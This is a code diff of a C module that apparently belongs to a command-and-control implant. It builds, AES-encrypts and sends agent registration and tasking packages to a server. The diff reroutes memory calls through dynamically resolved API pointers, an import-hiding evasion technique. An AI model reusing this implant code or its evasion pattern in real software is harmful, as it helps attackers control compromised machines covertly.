@@ -9,9 +9,9 @@ pPackage CreatePackage(UINT32 CommandID) {
 	pPackage pack = NULL;
 
 	//allocate the pointer to memory location for the total package.
-	pack = LocalAlloc(LPTR, sizeof(Package));
+	pack = agent->apis->pLocalAlloc(LPTR, sizeof(Package));
 	//allocate the pointer to the memory location for the package's data buffer.
-	pack->Buffer = LocalAlloc(LPTR, sizeof(BYTE));
+	pack->Buffer = agent->apis->pLocalAlloc(LPTR, sizeof(BYTE));
 	//set data buffer length to 0.
 	pack->Length = 0;
 	//set request identifier to 1 (first request).
@@ -28,7 +28,7 @@ pPackage CreatePackage(UINT32 CommandID) {
 	return pack;
 }
 
-pPackage CreatePackageWithMetaData(UINT32 CommandID, pAgent Agent) {
+pPackage CreatePackageWithMetaData(UINT32 CommandID) {
 	pPackage pack = CreatePackage(CommandID);
 	int err = 0;
 
@@ -41,7 +41,7 @@ pPackage CreatePackageWithMetaData(UINT32 CommandID, pAgent Agent) {
 		printf("[error] attempting to add four bytes to package. %s\n", PackageErrorToString(err));
 		return NULL;
 	}
-	if ((err = AddInt32ToPackage(pack, Agent->config->AgentID)) != PACKAGE_SUCCESS) {
+	if ((err = AddInt32ToPackage(pack, agent->config->AgentID)) != PACKAGE_SUCCESS) {
 		printf("[error] attempting to add four bytes to package. %s\n", PackageErrorToString(err));
 		return NULL;
 	}
@@ -53,11 +53,11 @@ pPackage CreatePackageWithMetaData(UINT32 CommandID, pAgent Agent) {
 		printf("[error] attempting to add four bytes to package. %s\n", PackageErrorToString(err));
 		return NULL;
 	}
-	if ((err = AddInt32ToPackage(pack, StringLengthA(Agent->config->AgentName))) != PACKAGE_SUCCESS) {
+	if ((err = AddInt32ToPackage(pack, StringLengthA(agent->config->AgentName))) != PACKAGE_SUCCESS) {
 		printf("[error] attempting to add agent name length to package. %s\n", PackageErrorToString(err));
 		return NULL;
 	}
-	if ((err = AddStringToPackage(pack, Agent->config->AgentName)) != PACKAGE_SUCCESS) {
+	if ((err = AddStringToPackage(pack, agent->config->AgentName)) != PACKAGE_SUCCESS) {
 		printf("[error] attempting to add string to package. %s\n", PackageErrorToString(err));
 		return NULL;
 	}
@@ -84,7 +84,7 @@ INT AddInt32ToPackage(pPackage pack, UINT32 data) {
 		return PACKAGE_DOES_NOT_EXIST;
 
 	//reallocate memory buffer with extended length.
-	pack->Buffer = LocalReAlloc(pack->Buffer, 
+	pack->Buffer = agent->apis->pLocalReAlloc(pack->Buffer,
 		pack->Length + sizeof(UINT32), 
 		LMEM_MOVEABLE
 	);
@@ -131,7 +131,7 @@ INT AddInt64ToPackage(pPackage pack, UINT64 data) {
 		return PACKAGE_DOES_NOT_EXIST;
 	}
 	//reallocate memory buffer with extended length
-	pack->Buffer = LocalReAlloc(pack->Buffer, 
+	pack->Buffer = agent->apis->pLocalReAlloc(pack->Buffer, 
 		pack->Length + sizeof(UINT64), 
 		LMEM_MOVEABLE
 	);
@@ -155,7 +155,7 @@ INT AddBoolToPackage(pPackage pack, BOOLEAN data) {
 	}
 
 	//reallocate memory buffer with extended length.
-	pack->Buffer = LocalReAlloc(pack->Buffer, 
+	pack->Buffer = agent->apis->pLocalReAlloc(pack->Buffer,
 		pack->Length + sizeof(UINT32),  // using uint32 for size rather than single byte for bool. Keeps the size uniform & reduces paddding needs.
 		LMEM_MOVEABLE
 	);
@@ -208,14 +208,14 @@ INT AddPaddingToPackage(pPackage pack, PCHAR data, SIZE_T size) {
 	if (!data)
 		return PACKAGE_DATA_DOES_NOT_EXIST;
 
-	pack->Buffer = LocalReAlloc(pack->Buffer,
+	pack->Buffer = agent->apis->pLocalReAlloc(pack->Buffer,
 		pack->Length + size,
 		LMEM_MOVEABLE | LMEM_ZEROINIT
 	);
 	if (!pack->Buffer)
 		return PACKAGE_BUFFER_REALLOC_FAILED;
 
-	CopyMemory((PUCHAR)pack->Buffer + pack->Length, data, size);
+	MemoryCopy((PUCHAR)pack->Buffer + pack->Length, data, size);
 
 	pack->Length += size;
 
@@ -234,7 +234,7 @@ INT AddBytesToPackage(pPackage pack, PBYTE data, SIZE_T size) {
 	if (!size || size < 1)
 		return PACKAGE_UNEXPECTED_DATA_SIZE;
 
-	pack->Buffer = LocalReAlloc(pack->Buffer, 
+	pack->Buffer = agent->apis->pLocalReAlloc(pack->Buffer, 
 		pack->Length + size, 
 		LMEM_MOVEABLE | LMEM_ZEROINIT
 	);
@@ -242,7 +242,7 @@ INT AddBytesToPackage(pPackage pack, PBYTE data, SIZE_T size) {
 	if (!pack->Buffer)
 		return PACKAGE_BUFFER_REALLOC_FAILED;
 
-	CopyMemory((PUCHAR)pack->Buffer + pack->Length, data, size);
+	MemoryCopy((PUCHAR)pack->Buffer + pack->Length, data, size);
 	pack->Length += size; 
 
 	return PACKAGE_SUCCESS;
@@ -256,7 +256,7 @@ INT AddWStringToPackage(pPackage pack, PWCHAR data) {
 	return AddBytesToPackage(pack, (PBYTE)data, StringLengthW(data) * 2);
 }
 
-INT DestroyPackage(pPackage pack, pAgent agent) {
+INT DestroyPackage(pPackage pack) {
 	pPackage pkg = agent->packages;
 
 	if (!pack)
@@ -274,13 +274,13 @@ INT DestroyPackage(pPackage pack, pAgent agent) {
 	if (pack->Buffer)
 	{
 		MemorySet(pack->Buffer, 0, pack->Length);
-		LocalFree(pack->Buffer);
+		agent->apis->pLocalFree(pack->Buffer);
 		pack->Buffer = NULL;
 	}
 
 
 	MemorySet(pack, 0, sizeof(Package));
-	LocalFree(pack);
+	agent->apis->pLocalFree(pack);
 	pack = NULL;
 
 	return PACKAGE_SUCCESS;
@@ -318,7 +318,7 @@ LPSTR PackageErrorToString(INT error) {
 	return errorstr;
 }
 
-INT PackageSendMetaDataPackage(pPackage pack, PVOID pResponse, PSIZE_T pSize, pAgent Agent) {
+INT PackageSendMetaDataPackage(pPackage pack, PVOID pResponse, PSIZE_T pSize) {
 	BOOL Success;
 	if (!pack)
 		return PACKAGE_DOES_NOT_EXIST;
@@ -330,27 +330,26 @@ INT PackageSendMetaDataPackage(pPackage pack, PVOID pResponse, PSIZE_T pSize, pA
 
 	if (pack->Encrypt)
 	{
-		BOOL Encrypt = TRUE;
 		INT err;
 		//TODO perform encryption.
 		if ((err = AESCTR(
-			(BYTE*)pack->Buffer + (PACKAGE_HEADER_LENGTH + sizeof(INT) + StringLengthA(Agent->config->AgentName) + Agent->EncryptedAESKeySize + Agent->EncryptedIVSize),	//buffer to encrypt. BUFF START + HEADERS + AgentName Length + AgentName String Length (part of Headers) + ENCRYPTED KEY LENGTH + PREENCRYPTED AESKEY + ENCRYPTED IV LENGTH + PREENCRYPTED IV
-			pack->Length - (PACKAGE_HEADER_LENGTH + sizeof(INT) + StringLengthA(Agent->config->AgentName) + Agent->EncryptedAESKeySize + Agent->EncryptedIVSize),			//SIZE OF BUFFER TO ENCRYPT. BUFFER LEN - (HEADERS + AgentName Length + AgentName String Length (part of Headers)) - (ENCRYPTED KEY LENGTH + PREENCRYPTED AESKEY + ENCRYPTED IV LENGTH + PREENCRYPTED IV)
-			Agent->AESKey, AES_256_KEY_SIZE, Agent->IV, Encrypt)																//AES KEY, AES KEY SIZE, IV
+			(BYTE*)pack->Buffer + (PACKAGE_HEADER_LENGTH + sizeof(INT) + StringLengthA(agent->config->AgentName) + agent->EncryptedAESKeySize + agent->EncryptedIVSize),	//buffer to encrypt. BUFF START + HEADERS + AgentName Length + AgentName String Length (part of Headers) + ENCRYPTED KEY LENGTH + PREENCRYPTED AESKEY + ENCRYPTED IV LENGTH + PREENCRYPTED IV
+			pack->Length - (PACKAGE_HEADER_LENGTH + sizeof(INT) + StringLengthA(agent->config->AgentName) + agent->EncryptedAESKeySize + agent->EncryptedIVSize),			//SIZE OF BUFFER TO ENCRYPT. BUFFER LEN - (HEADERS + AgentName Length + AgentName String Length (part of Headers)) - (ENCRYPTED KEY LENGTH + PREENCRYPTED AESKEY + ENCRYPTED IV LENGTH + PREENCRYPTED IV)
+			agent->AESKey, AES_256_KEY_SIZE, agent->IV)																//AES KEY, AES KEY SIZE, IV
 			) != 0) {
 			return err;
 		}
 	}
 
 	//TODO perform sending of package.
-	if (!(Success = SendRegisterRequest(Agent, Agent->packages->Buffer, Agent->packages->Length))) {
+	if (!(Success = SendRegisterRequest(agent->packages->Buffer, agent->packages->Length))) {
 		return PACKAGE_HAS_NOT_BEEN_SENT_TO_SERVER;
 	}
 
 	return PACKAGE_SUCCESS;
 } 
 
-BOOL PackageSendAll(pAgent agent, OUT pDataBuffer Response, OUT PSIZE_T Size)
+BOOL PackageSendAll(OUT pDataBuffer Response, OUT PSIZE_T Size)
 {
 	BOOL Success = FALSE;
 	pPackage pack = NULL;
@@ -363,8 +362,8 @@ BOOL PackageSendAll(pAgent agent, OUT pDataBuffer Response, OUT PSIZE_T Size)
 	//coalesce all waiting packages into one big pacakge.
 	while (AgentPackList)
 	{
-		PackageAddInt32(pack, AgentPackList->CommandID);
-		PackageAddInt32(pack, AgentPackList->RequestID);
+		AddInt32ToPackage(pack, AgentPackList->CommandID);
+		AddInt32ToPackage(pack, AgentPackList->RequestID);
 		AddBytesToPackage(pack, AgentPackList->Buffer, AgentPackList->Length);
 		AgentPackList->Sent = TRUE;
 		PrevPackage = AgentPackList;
@@ -384,7 +383,7 @@ BOOL PackageSendAll(pAgent agent, OUT pDataBuffer Response, OUT PSIZE_T Size)
 	//encrypt the big package.
 	AESCTR((BYTE*)pack->Buffer + Offset, pack->Length - Offset, agent->AESKey, agent->AESKeySize, agent->IV);
 	//send the big package.
-	if ((PerformRequest(agent, pack->Buffer, pack->Length, Response, Size)) == 0)
+	if ((PerformRequest(pack->Buffer, pack->Length, Response, Size)) == 0)
 	{
 		Success = TRUE;
 	}
@@ -413,7 +412,7 @@ BOOL PackageSendAll(pAgent agent, OUT pDataBuffer Response, OUT PSIZE_T Size)
 					//destroy if instructed to do so.
 					if (CurrentPackage->Destroy)
 					{
-						DestroyPackage(CurrentPackage, agent);
+						DestroyPackage(CurrentPackage);
 						CurrentPackage = NULL;
 					}
 					CurrentPackage = agent->packages;
@@ -426,7 +425,7 @@ BOOL PackageSendAll(pAgent agent, OUT pDataBuffer Response, OUT PSIZE_T Size)
 						PrevPackage->Next = CurrentPackage->Next;
 						if (CurrentPackage->Destroy)
 						{
-							DestroyPackage(CurrentPackage, agent);
+							DestroyPackage(CurrentPackage);
 						}
 						CurrentPackage = PrevPackage->Next;
 					}
@@ -454,12 +453,12 @@ BOOL PackageSendAll(pAgent agent, OUT pDataBuffer Response, OUT PSIZE_T Size)
 		}
 	}
 
-	DestroyPackage(pack, agent);
+	DestroyPackage(pack);
 
 	return Success;
 }
 
-void AddPackageToAgentPackageList(pAgent agent, pPackage pack) {
+void AddPackageToAgentPackageList(pPackage pack) {
 	if (agent->packages == NULL)
 	{
 		agent->packages = pack;
